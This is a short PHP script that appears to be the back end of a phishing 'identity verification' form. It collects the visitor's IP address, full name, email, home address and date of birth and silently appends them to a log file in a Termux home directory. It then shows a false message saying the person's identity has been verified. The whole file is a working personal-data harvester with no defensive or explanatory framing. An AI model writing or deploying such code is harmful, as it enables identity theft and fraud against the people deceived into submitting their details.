<?php
$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'first' => $_POST['first_name'] ?? '',
    'last' => $_POST['last_name'] ?? '',
    'email' => $_POST['email'] ?? '',
    'address' => $_POST['address'] ?? '',
    'dob' => $_POST['dob'] ?? ''
];

$log = "\n═══════════════════════════════════════════════════════════\n";
$log .= "TIME: {$data['time']}\n";
$log .= "IP: {$data['ip']}\n";
$log .= "NAME: {$data['first']} {$data['last']}\n";
$log .= "EMAIL: {$data['email']}\n";
$log .= "ADDRESS: {$data['address']}\n";
$log .= "DOB: {$data['dob']}\n";
$log .= "═══════════════════════════════════════════════════════════\n";

file_put_contents("/data/data/com.termux/files/home/form_tool/data.txt", $log, FILE_APPEND);

echo "✅ Thank you! Your identity has been verified.";
?>
